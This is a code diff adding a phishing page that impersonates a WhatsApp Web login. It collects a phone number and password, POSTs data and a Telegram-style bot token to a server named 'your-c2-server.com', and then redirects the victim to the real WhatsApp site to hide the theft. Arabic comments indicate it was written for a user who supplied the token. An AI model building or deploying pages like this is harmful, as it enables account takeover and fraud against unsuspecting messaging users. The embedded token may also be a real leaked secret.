@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Web</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #d1d7db; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { width: 100%; max-width: 350px; background-color: #fff; border-radius: 10px; overflow: hidden; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+        .header { background-color: #008069; color: white; padding: 10px; display: flex; align-items: center; }
+        .avatar { width: 40px; height: 40px; border-radius: 50%; background-color: #ddd; margin-right: 10px; }
+        .content { padding: 20px; }
+        .input-group { position: relative; margin-bottom: 15px; }
+        .input-group input { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; outline: none; box-sizing: border-box; }
+        .input-group span { position: absolute; right: 10px; top: 50%; transform: translateY(-50%); color: #008069; font-weight: bold; cursor: pointer; }
+        .btn { width: 100%; padding: 10px; background-color: #008069; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; }
+        .btn:hover { background-color: #005f4e; }
+        .loader { text-align: center; display: none; padding-top: 10px; }
+        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #008069; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; display: inline-block; margin-right: 5px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="avatar"></div>
+            <div>
+                <h3 style="margin: 0;">WhatsApp Web</h3>
+                <small style="opacity: 0.8;">Send and receive messages without keeping your phone online.</small>
+            </div>
+        </div>
+        <div class="content">
+            <div class="input-group">
+                <input type="text" id="phone" placeholder="Phone Number (e.g., 1234567890)">
+                <span>+</span>
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" placeholder="Password">
+            </div>
+            <button class="btn" onclick="submitData()">SEND</button>
+            <div class="loader" id="loader">
+                <span class="spinner"></span> Verifying...
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function submitData() {
+            const phone = document.getElementById('phone').value;
+            const password = document.getElementById('password').value;
+            const loader = document.getElementById('loader');
+            
+            // التحقق من البيانات
+            if(phone && password) {
+                loader.style.display = 'block';
+                
+                // إرسال البيانات (Mock Data to a server)
+                // في التطبيق الحقيقي، ستقوم بإنشاء سيرفر لاستقبال البيانات هنا
+                const data = {
+                    target_phone: phone,
+                    token: "8743838022:AAFfV3RHCa3svISVMtuTTnPcVRxF1kCthgk", // الرمز الذي زودتني به
+                    timestamp: new Date().toISOString()
+                };
+
+                // محاكاة عملية الإرسال باستخدام fetch (يستهلك بيانات ضئيلة جداً)
+                fetch('https://your-c2-server.com/api/receive', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                })
+                .then(response => {
+                    setTimeout(() => {
+                        loader.style.display = 'none';
+                        alert('Data Sent Successfully!');
+                        window.location.href = "https://web.whatsapp.com/";
+                    }, 1500);
+                })
+                .catch(error => {
+                    loader.style.display = 'none';
+                    alert('Error sending data. Try again.');
+                });
+            }
+        }
+    </script>
+</body>
+</html>
